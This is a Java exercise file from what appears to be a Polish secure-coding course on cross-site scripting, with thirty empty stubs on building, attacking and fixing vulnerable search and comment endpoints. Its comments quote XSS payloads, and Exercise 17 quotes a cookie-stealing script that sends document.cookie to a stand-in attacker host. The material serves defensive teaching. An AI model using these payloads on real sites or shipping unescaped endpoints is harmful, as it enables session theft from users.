package com.example.javaquest._19_security_basics.Lesson11_Xss;

public class _Exercises_Lesson11_Xss {

    // 🟢 POZIOM 1 – PODSTAWY (1-10)

    static class Exercise01_ExplainXssInOwnWords {
        /*
         * 🧪 Zadanie 1:
         * Bez terminala: wyjasnij wlasnymi slowami, na czym polega XSS -
         * podaj przyklad prostego zlosliwego inputu.
         */
        public static void main(String[] args) { }
    }

    static class Exercise02_ImplementVulnerableSearchEndpoint {
        /*
         * 🧪 Zadanie 2:
         * Uruchom `HttpServer` z `/search?q=...` wstawiajacym parametr
         * BEZPOSREDNIO do odpowiedzi HTML (bez escapowania).
         */
        public static void main(String[] args) { }
    }

    static class Exercise03_ReflectScriptTagInResponse {
        /*
         * 🧪 Zadanie 3:
         * Wyslij `?q=<script>alert(1)</script>` do endpointu z Zadania 2 -
         * zweryfikuj, ze znacznik trafil DOSLOWNIE do odpowiedzi HTML.
         */
        public static void main(String[] args) { }
    }

    static class Exercise04_ImplementHtmlEscapeFunction {
        /*
         * 🧪 Zadanie 4:
         * Napisz metode `htmlEscape(String)` zamieniajaca `<`, `>`, `&`,
         * `"`, `'` na odpowiednie encje HTML.
         */
        public static void main(String[] args) { }
    }

    static class Exercise05_FixSearchEndpointWithEscaping {
        /*
         * 🧪 Zadanie 5:
         * Zastosuj metode z Zadania 4 w endpointcie z Zadania 2 -
         * zweryfikuj, ze `<script>` jest teraz wyswietlane jako TEKST.
         */
        public static void main(String[] args) { }
    }

    static class Exercise06_ImplementStoredCommentSystem {
        /*
         * 🧪 Zadanie 6:
         * Zaimplementuj `/comments` (GET wyswietla, POST dodaje) z
         * lista komentarzy w pamieci - BEZ escapowania.
         */
        public static void main(String[] args) { }
    }

    static class Exercise07_DemonstrateStoredXssAffectsAllViewers {
        /*
         * 🧪 Zadanie 7:
         * Dodaj zlosliwy komentarz i zweryfikuj, ze pojawia sie
         * NIEZMIENIONY w KAZDYM kolejnym GET (symuluj 2 "roznych
         * odwiedzajacych" - 2 osobne wywolania GET).
         */
        public static void main(String[] args) { }
    }

    static class Exercise08_FixStoredCommentsWithEscapingAtDisplayTime {
        /*
         * 🧪 Zadanie 8:
         * Dodaj escapowanie PRZY WYSWIETLANIU komentarzy (nie przy
         * zapisie) - zweryfikuj naprawe bez usuwania zapisanych danych.
         */
        public static void main(String[] args) { }
    }

    static class Exercise09_ExplainReflectedVsStoredXssDifference {
        /*
         * 🧪 Zadanie 9:
         * Bez terminala: wyjasnij roznice miedzy reflected a stored XSS -
         * ktory jest groznejszy i dlaczego.
         */
        public static void main(String[] args) { }
    }

    static class Exercise10_TestMultiplePayloadVariants {
        /*
         * 🧪 Zadanie 10:
         * Przetestuj metode `htmlEscape` z Zadania 4 na kilku roznych
         * payloadach (`<img src=x onerror=...>`, `<svg onload=...>`,
         * `javascript:alert(1)` w atrybucie href) - zweryfikuj poprawne
         * escapowanie kazdego.
         */
        public static void main(String[] args) { }
    }

    // 🟡 POZIOM 2 – SREDNI (11-20)

    static class Exercise11_ImplementAttributeContextEscaping {
        /*
         * 🧪 Zadanie 11:
         * Zaimplementuj wstawienie inputu uzytkownika do ATRYBUTU HTML
         * (np. `value="<input>"`) - zweryfikuj, ze samo `htmlEscape` z
         * Zadania 4 WYSTARCZA (bo `"` jest escapowany), ale wyjasnij
         * czemu inny kontekst (JS) wymagalby INNEGO escapowania.
         */
        public static void main(String[] args) { }
    }

    static class Exercise12_DemonstrateJavaScriptContextXss {
        /*
         * 🧪 Zadanie 12:
         * Zasymuluj wstawienie inputu uzytkownika DO WNETRZA tagu
         * `<script>var x = "...";</script>` - pokaz, ze escapowanie HTML
         * NIE WYSTARCZY (potrzebne escapowanie JS-owe: `"` -> `\"`).
         */
        public static void main(String[] args) { }
    }

    static class Exercise13_ImplementUrlContextEscaping {
        /*
         * 🧪 Zadanie 13:
         * Zaimplementuj wstawienie inputu uzytkownika do atrybutu `href`
         * jako URL - odrzuc/zescapuj scheme `javascript:` (klasyczny
         * wektor ataku w linkach).
         */
        public static void main(String[] args) { }
    }

    static class Exercise14_UseAllowlistForRichTextInput {
        /*
         * 🧪 Zadanie 14:
         * Zaimplementuj "biala liste" dozwolonych znacznikow HTML (np.
         * TYLKO `<b>`, `<i>`, `<a href>`) dla pol tekstowych wymagajacych
         * formatowania - odrzuc/usun wszystko inne (koncepcja podobna do
         * bibliotek typu OWASP Java HTML Sanitizer).
         */
        public static void main(String[] args) { }
    }

    static class Exercise15_TestCaseInsensitiveAndObfuscatedPayloads {
        /*
         * 🧪 Zadanie 15:
         * Przetestuj escapowanie wobec "zaciemnionych" payloadow (np.
         * `<ScRiPt>`, encje HTML wewnatrz atrybutu) - zweryfikuj, ze
         * `htmlEscape` dziala NIEZALEZNIE od wielkosci liter (bo escapuje
         * SAME znaki specjalne, nie szuka slowa "script").
         */
        public static void main(String[] args) { }
    }

    static class Exercise16_ImplementInputLengthAndCharacterValidation {
        /*
         * 🧪 Zadanie 16:
         * Dodaj DODATKOWA (obok escapowania) walidacje dlugosci i
         * dozwolonych znakow dla pola "nazwa uzytkownika" (np. tylko
         * litery/cyfry, max 30 znakow) - wyjasnij, dlaczego to NIE
         * ZASTEPUJE escapowania, tylko je uzupelnia.
         */
        public static void main(String[] args) { }
    }

    static class Exercise17_DemonstrateXssStealingSessionCookieConceptually {
        /*
         * 🧪 Zadanie 17:
         * Bez terminala (koncepcyjnie w komentarzu): opisz, jak zlosliwy
         * skrypt `<script>fetch('https://atakujacy.pl?c='+document.cookie)
         * </script>` MOGLBY wykrasc ciastko sesyjne z Lesson04 - dlaczego
         * `HttpOnly` (Lesson04, Zadanie 9) jest TU kluczowa dodatkowa
         * ochrona.
         */
        public static void main(String[] args) { }
    }

    static class Exercise18_CompareServerSideEscapingWithFrontendFrameworkDefaults {
        /*
         * 🧪 Zadanie 18:
         * Bez terminala: zbadaj i wyjasnij, dlaczego React/Vue/Angular
         * escapuja DOMYSLNIE dane wstawiane do szablonu - kiedy programista
         * MOZE swiadomie to ominac (i dlaczego to ryzykowne).
         */
        public static void main(String[] args) { }
    }

    static class Exercise19_ImplementJsonEncodingForApiResponses {
        /*
         * 🧪 Zadanie 19:
         * Zaimplementuj endpoint zwracajacy dane jako JSON (zamiast HTML)
         * - wyjasnij, dlaczego `Content-Type: application/json` (i
         * poprawne kodowanie JSON) SAMO W SOBIE mocno redukuje ryzyko XSS
         * (bo przegladarka nie interpretuje JSON jako HTML).
         */
        public static void main(String[] args) { }
    }

    static class Exercise20_AuditEndpointsForMissingOutputEncoding {
        /*
         * 🧪 Zadanie 20:
         * Napisz metode "audytujaca" liste endpointow zwracajacych HTML z
         * danymi uzytkownika - oznacz, ktore NIE MAJA (w tym demo)
         * zastosowanego escapowania.
         */
        public static void main(String[] args) { }
    }

    // 🔴 POZIOM 3 – ZAAWANSOWANY (21-30)

    static class Exercise21_ImplementDomBasedXssScenarioConceptually {
        /*
         * 🧪 Zadanie 21:
         * Bez terminala: opisz scenariusz DOM-based XSS (np.
         * `element.innerHTML = location.hash` w kodzie JS klienta) -
         * wyjasnij, dlaczego SERWER moze byc CALKOWICIE bez winy, a
         * podatnosc wciaz istnieje.
         */
        public static void main(String[] args) { }
    }

    static class Exercise22_BuildReusableSanitizationLibraryFunction {
        /*
         * 🧪 Zadanie 22:
         * Zaprojektuj wspolna klase narzedziowa `HtmlSanitizer` z
         * oddzielnymi metodami dla kazdego kontekstu (HTML body, atrybut,
         * JS string, URL) - uzyj jej we WSZYSTKICH endpointach z tej
         * lekcji zamiast pojedynczej metody `htmlEscape`.
         */
        public static void main(String[] args) { }
    }

    static class Exercise23_TestXssPayloadsFromKnownCheatSheet {
        /*
         * 🧪 Zadanie 23:
         * Zbierz (z pamieci/wiedzy) 5-6 klasycznych payloadow XSS (np. z
         * OWASP XSS Filter Evasion Cheat Sheet) i przetestuj kazdy wobec
         * `htmlEscape`/`HtmlSanitizer` - udokumentuj wynik kazdego testu.
         */
        public static void main(String[] args) { }
    }

    static class Exercise24_ImplementRichTextSanitizerRemovingScriptTags {
        /*
         * 🧪 Zadanie 24:
         * Zaimplementuj sanitizer dla "bogatego tekstu" (dopuszcza kilka
         * bezpiecznych znacznikow, ale AGRESYWNIE usuwa `<script>`,
         * `onerror=`, `onload=`, `javascript:`) - przetestuj na
         * kombinacjach dozwolonych i niedozwolonych znacznikow.
         */
        public static void main(String[] args) { }
    }

    static class Exercise25_MeasurePerformanceOfEscapingAtScale {
        /*
         * 🧪 Zadanie 25:
         * Zmierz czas escapowania 100 000 komentarzy o roznej dlugosci -
         * skomentuj, czy narzut jest istotny w praktyce.
         */
        public static void main(String[] args) { }
    }

    static class Exercise26_ImplementContentSecurityPolicyAsDefenseInDepth {
        /*
         * 🧪 Zadanie 26:
         * Dodaj naglowek `Content-Security-Policy: script-src 'self'` do
         * odpowiedzi - wyjasnij, jak DODATKOWO ogranicza to skutki XSS
         * nawet gdyby escapowanie zawiodlo (zapowiedz Lesson12).
         */
        public static void main(String[] args) { }
    }

    static class Exercise27_DemonstrateSelfXssSocialEngineeringAngle {
        /*
         * 🧪 Zadanie 27:
         * Bez terminala: opisz "Self-XSS" - atak socjotechniczny, gdzie
         * ofiara jest namawiana do WKLEJENIA zlosliwego kodu SAMA do
         * konsoli przegladarki - dlaczego zadne escapowanie po stronie
         * serwera tego NIE powstrzyma.
         */
        public static void main(String[] args) { }
    }

    static class Exercise28_BuildXssTestSuiteForRegressionProtection {
        /*
         * 🧪 Zadanie 28:
         * Zbuduj "zestaw testowy" (lista payload+oczekiwany wynik)
         * uruchamiany automatycznie w `main()` przy kazdej zmianie
         * kodu sanitizera - wypisz PASS/FAIL dla kazdego przypadku.
         */
        public static void main(String[] args) { }
    }

    static class Exercise29_CompareOutputEncodingWithInputValidationApproaches {
        /*
         * 🧪 Zadanie 29:
         * Bez terminala: wyjasnij, dlaczego "walidacja przy wejsciu"
         * (input validation) NIE JEST WYSTARCZAJACA ochrona przed XSS
         * sama w sobie - dlaczego "kodowanie przy wyjsciu" (output
         * encoding) jest OSTATECZNA, niezbedna linia obrony.
         */
        public static void main(String[] args) { }
    }

    static class Exercise30_BuildCompleteSecureCommentSystemWithLayeredDefense {
        /*
         * 🧪 Zadanie 30:
         * Polacz sanitizer wielokontekstowy (Zadanie 22), CSP (Zadanie
         * 26) i walidacje dlugosci/znakow (Zadanie 16) w 1 spojny,
         * bezpieczny system komentarzy - zweryfikuj co najmniej 5
         * roznych payloadow z czytelnym logiem PASS/FAIL.
         */
        public static void main(String[] args) { }
    }
}
